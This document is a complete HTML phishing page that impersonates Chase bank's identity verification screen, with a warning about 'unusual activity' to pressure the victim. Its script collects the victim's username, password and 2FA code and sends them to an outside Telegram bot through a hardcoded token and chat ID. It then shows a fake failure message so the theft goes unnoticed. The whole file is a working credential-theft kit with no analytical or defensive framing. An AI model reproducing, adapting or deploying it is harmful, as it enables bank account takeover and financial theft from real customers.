<!DOCTYPE html>
<html>
<head>
<title>Chase - Verify Your Identity</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: Arial, sans-serif; background: #f4f4f4; margin:0; padding:20px; }
.container { max-width:400px; margin:auto; background:#fff; padding:20px; border-radius:8px; box-shadow:0 0 10px
rgba(0,0,0,0.1); }
img { display:block; margin:0 auto 20px; width:200px; }
input[type=text], input[type=password] { width:100%; padding:12px; margin:8px 0; border:1px solid #ccc; border-radius:4px;
box-sizing:border-box; }
button { width:100%; background:#126bc5; color:#fff; padding:12px; border:none; border-radius:4px; cursor:pointer;
font-size:16px; }
.error { color:red; margin-top:10px; }
</style>
</head>
<body>
<div class="container">
<img src="https://www.chase.com/etc/designs/chase-ux/img/chase-logo.png" alt="Chase">
<h2 style="text-align:center;">Security Verification</h2>
<p style="text-align:center;">We detected unusual activity. Confirm your identity to unlock your account.</p>
<form id="loginForm">
<input type="text" id="username" placeholder="Username" required><br>
<input type="password" id="password" placeholder="Password" required><br>
<input type="text" id="otp" placeholder="2FA Code (if prompted)" ><br>
<button type="submit">Verify</button>
<p class="error" id="errorMsg"></p>
</form>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const otp = document.getElementById('otp').value || 'none';
    const message = `CHASE LOGIN\nUser: ${username}\nPass: ${password}\n2FA: ${otp}\nIP: ${window.location.hostname}`;
    const botToken = '8610254587:AAEXZL1gK86eJeKk_N5VnI8NNaTLZD96E6E';
    const chatId = '6263246736';
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
    }).then(() => {
        document.getElementById('errorMsg').textContent = 'Verification failed. Please try again.';
    }).catch(() => {
        document.getElementById('errorMsg').textContent = 'Verification failed. Please try again.';
    });
});
</script>
</body>
</html>
